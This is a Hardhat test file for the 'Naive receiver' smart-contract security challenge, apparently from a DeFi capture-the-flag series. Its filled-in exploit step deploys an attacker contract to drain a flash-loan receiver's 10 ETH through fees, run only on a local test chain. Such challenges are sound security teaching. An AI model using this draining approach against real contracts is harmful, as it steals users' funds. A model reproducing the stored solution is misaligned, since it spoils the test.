const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("[Challenge] Naive receiver", function () {
  let deployer, user, attacker;

  // Pool has 1000 ETH in balance
  const ETHER_IN_POOL = ethers.utils.parseEther("1000");

  // Receiver has 10 ETH in balance
  const ETHER_IN_RECEIVER = ethers.utils.parseEther("10");

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, user, attacker] = await ethers.getSigners();

    const LenderPoolFactory = await ethers.getContractFactory(
      "NaiveReceiverLenderPool",
      deployer
    );
    const FlashLoanReceiverFactory = await ethers.getContractFactory(
      "FlashLoanReceiver",
      deployer
    );

    // Deploy NaiveReceiverLenderPool
    this.pool = await LenderPoolFactory.deploy();

    // Send transaction to NaiveReceiverLenderPool as deployer
    await deployer.sendTransaction({
      to: this.pool.address,
      value: ETHER_IN_POOL,
    });

    // Assert that balance in NaiveReceiverLenderPool is equal to sent ETH
    expect(await ethers.provider.getBalance(this.pool.address)).to.be.equal(
      ETHER_IN_POOL
    );

    // Assert that fixed fee is 1 ETH
    expect(await this.pool.fixedFee()).to.be.equal(
      ethers.utils.parseEther("1")
    );

    // Deploy FlashLoanReceiver
    this.receiver = await FlashLoanReceiverFactory.deploy(this.pool.address);
    // Send transaction to FlashLoanReceiver as deployer
    await deployer.sendTransaction({
      to: this.receiver.address,
      value: ETHER_IN_RECEIVER,
    });

    // Assert that balance in FlashLoanReceiver is equal to sent ETH
    expect(await ethers.provider.getBalance(this.receiver.address)).to.be.equal(
      ETHER_IN_RECEIVER
    );
  });

  it("Exploit", async function () {
    /** CODE YOUR EXPLOIT HERE */

    const NaiveAttackerFactory = await ethers.getContractFactory(
      "NaiveAttacker",
      attacker
    );

    const attackerContract = await NaiveAttackerFactory.deploy(
      this.pool.address
    );

    await attackerContract.connect(attacker).attack(this.receiver.address, 10);
  });

  after(async function () {
    /** SUCCESS CONDITIONS */

    // All ETH has been drained from the receiver
    expect(await ethers.provider.getBalance(this.receiver.address)).to.be.equal(
      "0"
    );
    expect(await ethers.provider.getBalance(this.pool.address)).to.be.equal(
      ETHER_IN_POOL.add(ETHER_IN_RECEIVER)
    );
  });
});
